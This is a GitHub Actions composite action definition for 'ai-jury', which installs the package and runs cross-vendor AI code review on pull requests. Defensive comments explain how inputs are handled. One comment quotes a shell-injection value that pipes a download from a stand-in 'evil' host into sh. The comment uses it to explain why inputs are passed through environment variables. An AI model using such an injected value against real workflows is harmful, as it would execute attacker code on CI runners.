name: "ai-jury Review"
description: "Convene a cross-vendor multi-agent code review jury on pull requests"
author: "Berkay Turancı"
branding:
  icon: "check-circle"
  color: "purple"

inputs:
  github-token:
    description: "GitHub Token for posting PR comments and inspecting diffs"
    required: false
    default: "${{ github.token }}"
  openai-api-key:
    description: "OpenAI API Key for Codex/GPT reviewers"
    required: false
    default: ""
  anthropic-api-key:
    description: "Anthropic API Key for Claude reviewers"
    required: false
    default: ""
  gemini-api-key:
    description: "Gemini API Key for Google reviewers"
    required: false
    default: ""
  xai-api-key:
    description: "xAI API Key for Grok reviewers (xai-api seats, read as XAI_API_KEY)"
    required: false
    default: ""
  args:
    description: "Additional arguments to pass to the jury CLI (e.g. '--post --auto')"
    required: false
    default: "--auto --post"
  min-vendors:
    description: >-
      Fail the run (exit 3) unless at least this many distinct vendors actually
      CONTRIBUTED a review. 0 opts out. Defaults to 2, so a consumer of this
      Action cannot silently inherit a panel that collapsed to one vendor
      (#682) — an agent can be installed, probe clean, and return nothing, and
      a configured CLI that is not installed at all counts the same way: the
      gate scopes on vendors CONFIGURED, so a jury.toml naming three vendors
      fails on a runner carrying one. An empty value means "use the default",
      because passing an unset repository/organization variable through this
      input arrives as the empty string; a non-numeric value fails with exit 2.
      Ignored when `args` already names --min-vendors or --no-min-vendors, in
      either the `--flag value` or the `--flag=value` spelling.
    required: false
    default: "2"
  version:
    description: >-
      ai-jury package version to install. Empty (the default) installs the
      release this Action's own tree declares in its pyproject.toml, so
      `@vX.Y.Z` runs ai-jury X.Y.Z and `@v1` runs the release the alias
      points at (#867). A branch or SHA ref installs the version its own tree
      declares, and fails until that release is on PyPI; pass `version: latest`
      or a released number instead. `latest` installs the newest release on
      PyPI, the behaviour before #867; any other value must look like a version
      number.
    required: false
    default: ""

runs:
  using: "composite"
  steps:
    - name: Set up Python
      uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97
      with:
        python-version: "3.13"

    - name: Install ai-jury
      shell: bash
      # `version` goes through the environment like every other caller-supplied
      # input. A `${{ }}` expression is substituted textually before bash parses
      # the line, so a value carrying a quote and a `;` becomes shell code —
      # `version: '1.0"; curl evil | sh; "'` would execute. #584 moved the other
      # four inputs out for exactly this reason and left this one behind.
      #
      # An empty `version` used to mean `pip install ai-jury`, the newest release, so
      # pinning the Action pinned only its YAML (#867). The requirement is now worked
      # out by scripts/action_install_spec.py from `version` and the pyproject.toml in
      # GITHUB_ACTION_PATH, the Action's own checkout at the ref the workflow named.
      env:
        INPUT_VERSION: ${{ inputs.version }}
      run: |
        SPEC="$(python "$GITHUB_ACTION_PATH/scripts/action_install_spec.py")" || exit 2
        # On Windows Python's stdout turns "\n" into "\r\n" and command substitution
        # strips only the "\n", so a CR would reach pip. The script writes no newline
        # at all; this strips a stray CR anyway. `$'\r'` is bash (3.2+), the shell of
        # this step on every runner OS.
        SPEC="${SPEC%$'\r'}"
        echo "ai-jury: installing $SPEC"
        # pip's own error does not say why a pinned version is missing. Between a
        # version bump and its PyPI publication, a branch or SHA ref pins a release
        # that does not exist yet, so name the way out. $SPEC is the script's
        # validated output, not an input.
        if ! python -m pip install "$SPEC"; then
          echo "ai-jury: $SPEC could not be installed. A branch or SHA ref installs the version its own tree declares, and fails until that release is on PyPI; pass version: latest or a released number." >&2
          exit 1
        fi

    - name: Run ai-jury
      shell: bash
      env:
        GH_TOKEN: ${{ inputs.github-token }}
        OPENAI_API_KEY: ${{ inputs.openai-api-key }}
        ANTHROPIC_API_KEY: ${{ inputs.anthropic-api-key }}
        GEMINI_API_KEY: ${{ inputs.gemini-api-key }}
        XAI_API_KEY: ${{ inputs.xai-api-key }}
        INPUT_ARGS: ${{ inputs.args }}
        INPUT_MIN_VENDORS: ${{ inputs.min-vendors }}
        PR_NUM: ${{ github.event.pull_request.number }}
        BASE_REF: ${{ github.base_ref }}
        # The workflow is the repository's own deliberate CI, so a committed jury.toml with
        # command seats is trusted here without a prompt. Without this, a jury.toml that
        # defines any `command` seat is refused non-interactively (the untrusted-checkout
        # guard, ai-jury >= the release that ships it), and the Action would fail for every
        # repo that committed a CLI-agent config. `on: pull_request` keeps a fork PR's config
        # to a read-only token and no secrets.
        JURY_TRUST_PROJECT_CONFIG: "1"
      run: |
        # The cross-vendor guard, made explicit for Action consumers (#682).
        # `args` wins when it already says something about it, so a caller who
        # has decided is never overridden.
        #
        # An EMPTY value is the default, not an error: passing an unset
        # repository or organization variable through the `min-vendors` input
        # arrives here as "", and hard-failing that broke a workflow that had
        # asked for nothing unusual. The Action's own `default:` never reaches
        # this branch — GitHub applies it only when the input is omitted.
        MIN_VENDORS="$INPUT_MIN_VENDORS"
        if [ -z "$MIN_VENDORS" ]; then
          MIN_VENDORS="2"
        fi
        # Anything non-numeric IS an error, and is caught before the value is
        # word-split into the command line: it is caller-supplied, and
        # `min-vendors: "--post"` would otherwise smuggle in a flag.
        case "$MIN_VENDORS" in
          *[!0-9]*)
            echo "ai-jury: min-vendors must be a non-negative integer (got '$MIN_VENDORS')" >&2
            exit 2
            ;;
        esac
        GUARD="--min-vendors $MIN_VENDORS"
        # Both spellings count as "the caller has decided": `--min-vendors 0`
        # and `--min-vendors=0` mean the same thing to argparse, and matching
        # only the space-separated form appended a second, contradicting
        # `--min-vendors 2` behind the caller's back. The padding is what makes
        # a flag at the very start or the very end of `args` match too.
        case " $INPUT_ARGS " in
          *" --min-vendors "*|*" --min-vendors="*) GUARD="" ;;
          *" --no-min-vendors "*|*" --no-min-vendors="*) GUARD="" ;;
        esac
        if [ -n "$PR_NUM" ] && [ "$PR_NUM" != "null" ]; then
          jury --pr "$PR_NUM" $INPUT_ARGS $GUARD
        else
          git diff "origin/$BASE_REF...HEAD" | jury --diff-file - $INPUT_ARGS $GUARD
        fi
